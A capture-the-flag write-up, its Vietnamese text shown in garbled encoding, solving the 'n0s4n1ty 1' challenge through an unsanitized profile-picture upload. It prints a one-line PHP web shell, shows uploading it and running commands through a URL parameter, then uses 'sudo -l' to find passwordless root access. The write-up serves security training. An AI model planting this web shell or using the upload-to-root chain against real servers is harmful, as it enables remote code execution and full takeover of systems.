# ğŸ§  Challenge: n0s4n1ty 1

---

## ğŸ“ **Description**

> A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

---

## ğŸ’¡ **Hint**

- `File upload was not sanitized`
- `Whenever you get a shell on a remote machine, check sudo -l`

---

## ğŸ” **Initial Analysis**

Khi khá»Ÿi Ä‘á»™ng challenge, ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c cung cáº¥p má»™t giao diá»‡n web vá»›i chá»©c nÄƒng **táº£i áº£nh Ä‘áº¡i diá»‡n**.
![](../img/n0s4n1ty-1.png)
Kiá»ƒm tra mÃ£ JavaScript phÃ­a frontend:

```javascript
var loadFile = function(event) {
    var input = event.target;
    var file = input.files[0];
    var type = file.type;
    var output = document.getElementById('preview_img');

    output.src = URL.createObjectURL(event.target.files[0]);
    output.onload = function() {
        URL.revokeObjectURL(output.src); // free memory
    }
};
```
ÄÃ¢y chá»‰ lÃ  mÃ£ preview áº£nh, khÃ´ng cÃ³ cÆ¡ cháº¿ lá»c ná»™i dung file upload, cho tháº¥y kháº£ nÄƒng tá»“n táº¡i lá»— há»•ng unsanitized file upload.
Kiá»ƒm tra sever vÃ  web cÃ³ hoáº¡t Ä‘á»™ng á»•n Ä‘á»‹nh báº±ng viá»‡c upload thá»­ 1 file áº£nh cÃ³ dung lÆ°á»£ng nhá»:
![](../img/n0s4n1ty-1-test.png)
![](../img/n0s4n1ty-1-test-output.png)
![](../img/n0s4n1ty-1-test-output-img.png)

---
## ğŸš© **Exploit: Unsanitized File Upload â†’ Web Shell**

**Táº¡o 1 file shell php vá»›i ná»™i dung:**
```php
<?php system($_GET['cmd']); ?>
```
**Upload file php lÃªn web vÃ  truy cáº­p vÃ o Ä‘Æ°á»ng dáº«n http://<host>:<port>/uploads/shell.php?cmd=id** 
> Ta tháº¥y lá»‡nh Ä‘Æ°á»£c thá»±c thi, cho tháº¥y ta cÃ³ thá»ƒ **Remote Code Execution.**

NhÆ° hint cá»§a bÃ i thÃ¬ ta dÃ¹ng cÃ¢u lá»‡nh ``sudo -l`` cho káº¿t quáº£ : 
![](../img/n0s4n1ty-1-payload.png)
> Káº¿t quáº£ cho ta biáº¿t : User hiá»‡n táº¡i cÃ³ thá»ƒ thá»±c thi má»i lá»‡nh dÆ°á»›i quyá»n root mÃ  khÃ´ng cáº§n máº­t kháº©u.
